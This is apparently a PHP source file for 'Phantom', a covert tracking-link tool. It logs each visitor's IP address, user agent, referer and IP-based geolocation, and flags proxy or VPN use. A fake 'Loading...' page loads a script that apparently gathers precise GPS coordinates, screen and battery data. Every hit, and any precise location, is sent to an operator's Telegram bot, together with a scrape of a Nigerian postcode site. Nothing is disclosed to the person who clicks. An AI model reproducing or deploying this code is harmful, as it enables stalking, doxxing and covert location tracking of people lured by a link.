<?php
/**
 * Phantom – Core Tracker
 * Logs IP, geo, device data + attempts precise location + postcode.gov.ng scrape
 * Sends full report to Telegram
 */

$config = require __DIR__ . '/config.php';

// =====================================================
// Helper Functions
// =====================================================

function getRealIP() {
    $headers = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'REMOTE_ADDR'
    ];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = trim(explode(',', $_SERVER[$header])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function sendTelegram($message) {
    global $config;
    if (empty($config['telegram']['enabled'])) return;

    $token = $config['telegram']['bot_token'] ?? '';
    $chat  = $config['telegram']['chat_id'] ?? '';
    if (!$token || !$chat) return;

    $url = "https://api.telegram.org/bot{$token}/sendMessage";

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => [
            'chat_id'                  => $chat,
            'text'                     => $message,
            'parse_mode'               => 'HTML',
            'disable_web_page_preview' => true
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 6,
        CURLOPT_CONNECTTIMEOUT => 4
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function fetchPostcodeHtml($lat, $lon) {
    // Try to request the find page (best effort)
    // Note: postcode.gov.ng may require interaction, this is a best-effort scrape
    $url = "https://postcode.gov.ng/find";

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT        => 8,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml',
            'Accept-Language: en-NG,en;q=0.9'
        ]
    ]);
    $html = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode >= 200 && $httpCode < 400 && $html) {
        // Return a shortened version to avoid huge Telegram messages
        $clean = preg_replace('/\s+/', ' ', strip_tags($html));
        return substr($clean, 0, 1200);
    }
    return null;
}

// =====================================================
// Main Logic
// =====================================================

header('Access-Control-Allow-Origin: *');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

$trackId  = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : null;
$redirect = isset($_GET['r']) ? $_GET['r'] : ($config['default_redirect'] ?? 'https://www.google.com');

if (!$trackId) {
    header('Location: /');
    exit;
}

$ip      = getRealIP();
$ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$lang    = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$time    = date('Y-m-d H:i:s');

// ---------- Geo from IP ----------
$geo = [
    'country' => '', 'region' => '', 'city' => '', 'zip' => '',
    'lat' => '', 'lon' => '', 'isp' => '', 'org' => '', 'as' => '',
    'proxy' => false, 'mobile' => false
];

$geoJson = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,proxy,hosting,mobile");
if ($geoJson) {
    $g = json_decode($geoJson, true);
    if (($g['status'] ?? '') === 'success') {
        $geo = [
            'country' => $g['country'] ?? '',
            'region'  => $g['regionName'] ?? '',
            'city'    => $g['city'] ?? '',
            'zip'     => $g['zip'] ?? '',
            'lat'     => $g['lat'] ?? '',
            'lon'     => $g['lon'] ?? '',
            'isp'     => $g['isp'] ?? '',
            'org'     => $g['org'] ?? '',
            'as'      => $g['as'] ?? '',
            'proxy'   => !empty($g['proxy']) || !empty($g['hosting']),
            'mobile'  => !empty($g['mobile'])
        ];
    }
}

// ---------- Save log ----------
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0755, true);
}
$logFile = $logDir . '/' . $trackId . '.json';

$entry = [
    'time'    => $time,
    'ip'      => $ip,
    'ua'      => $ua,
    'referer' => $referer,
    'lang'    => $lang,
    'geo'     => $geo,
    'precise' => null,
    'screen'  => null,
    'battery' => null
];

$logs = [];
if (file_exists($logFile)) {
    $logs = json_decode(file_get_contents($logFile), true) ?: [];
}
$logs[] = $entry;
file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// ---------- Telegram notification ----------
$proxyFlag = $geo['proxy'] ? '⚠️ PROXY/VPN' : '✅ Clean';
$msg  = "👻 <b>Phantom Hit</b>\n";
$msg .= "ID: <code>{$trackId}</code>\n";
$msg .= "Time: {$time}\n";
$msg .= "IP: <code>{$ip}</code>\n";
$msg .= "Loc: " . trim(($geo['city'] ? $geo['city'] . ', ' : '') . ($geo['region'] ? $geo['region'] . ', ' : '') . $geo['country']) . "\n";
$msg .= "ZIP: " . ($geo['zip'] ?: '-') . "\n";
$msg .= "ISP: " . ($geo['isp'] ?: '-') . "\n";
$msg .= "{$proxyFlag}\n";
$msg .= "UA: " . substr($ua, 0, 90) . (strlen($ua) > 90 ? '...' : '') . "\n";
$msg .= "🔗 <a href=\"" . rtrim($config['domain'], '/') . "/liveview.php?id={$trackId}\">Open Live View</a>";

sendTelegram($msg);

// =====================================================
// Handle JS beacon (precise data from track.js)
// =====================================================
$isJsRequest = isset($_GET['js']) || 
               (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') ||
               $_SERVER['REQUEST_METHOD'] === 'POST';

if ($isJsRequest) {
    $input = json_decode(file_get_contents('php://input'), true);

    if (is_array($input) && !empty($logs)) {
        $lastIndex = count($logs) - 1;
        $logs[$lastIndex] = array_merge($logs[$lastIndex], $input);
        file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

        // If we got precise coordinates → try postcode scrape + extra Telegram
        if (!empty($input['precise']['lat']) && !empty($input['precise']['lon'])) {
            $p = $input['precise'];
            $extra  = "📍 <b>Precise Location Received</b>\n";
            $extra .= "ID: <code>{$trackId}</code>\n";
            $extra .= "Lat: <code>{$p['lat']}</code>\n";
            $extra .= "Lon: <code>{$p['lon']}</code>\n";
            $extra .= "Accuracy: " . ($p['accuracy'] ?? '?') . " m\n";

            if (!empty($config['enable_postcode_scrape'])) {
                $htmlSnippet = fetchPostcodeHtml($p['lat'], $p['lon']);
                if ($htmlSnippet) {
                    $extra .= "\n📄 <b>postcode.gov.ng response (snippet):</b>\n";
                    $extra .= "<code>" . htmlspecialchars(substr($htmlSnippet, 0, 800)) . "</code>";
                } else {
                    $extra .= "\n📄 postcode.gov.ng: no usable HTML returned";
                }
            }

            sendTelegram($extra);
        }
    }

    header('Content-Type: application/json');
    echo json_encode(['ok' => true]);
    exit;
}

// =====================================================
// Normal browser visit → show loading page + load track.js
// =====================================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            background: #07070b;
            color: #888;
            font-family: system-ui, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-size: 0.95rem;
        }
    </style>
</head>
<body>
    <div>Loading...</div>

    <script>
        window.PHANTOM_ID = <?= json_encode($trackId) ?>;
        window.PHANTOM_REDIRECT = <?= json_encode($redirect) ?>;
    </script>
    <script src="assets/js/track.js"></script>
</body>
</html>
